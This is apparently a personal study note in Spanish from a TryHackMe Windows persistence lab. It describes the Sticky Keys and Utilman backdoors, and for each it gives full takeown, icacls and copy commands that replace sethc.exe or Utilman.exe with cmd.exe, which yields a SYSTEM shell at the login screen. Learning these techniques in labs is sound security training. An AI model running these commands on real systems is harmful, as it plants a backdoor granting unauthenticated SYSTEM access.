---
tags: [red-team, persistence, windows, rdp, login]
created: 2026-04-20
source: TryHackMe - Windows Local Persistence
related:
  - "[[Logon Triggered Persistence]]"
  - "[[Tampering With Unprivileged Accounts]]"
---

Técnicas para obtener acceso a una terminal desde la pantalla de login, sin necesidad de credenciales válidas. Requieren acceso físico o RDP.

---

## Sticky Keys

Al presionar `SHIFT` 5 veces, Windows ejecuta `C:\Windows\System32\sethc.exe`. Si reemplazamos este binario por `cmd.exe`, obtenemos una consola con privilegios SYSTEM desde la pantalla de login.

### Proceso

Tomar ownership y reemplazar:

```shell
takeown /f c:\Windows\System32\sethc.exe

icacls C:\Windows\System32\sethc.exe /grant Administrator:F

copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

> [!tip] Bloquear la sesión (no cerrarla) y presionar `SHIFT` 5 veces en la pantalla de login para obtener una terminal SYSTEM.

---

## Utilman

Utilman (`C:\Windows\System32\Utilman.exe`) se ejecuta con privilegios SYSTEM al hacer clic en el botón **"Ease of Access"** (accesibilidad) de la pantalla de login.

### Proceso

Mismo enfoque que Sticky Keys:

```shell
takeown /f c:\Windows\System32\utilman.exe

icacls C:\Windows\System32\utilman.exe /grant Administrator:F

copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

Bloquear sesión → clic en el botón de accesibilidad → terminal SYSTEM.
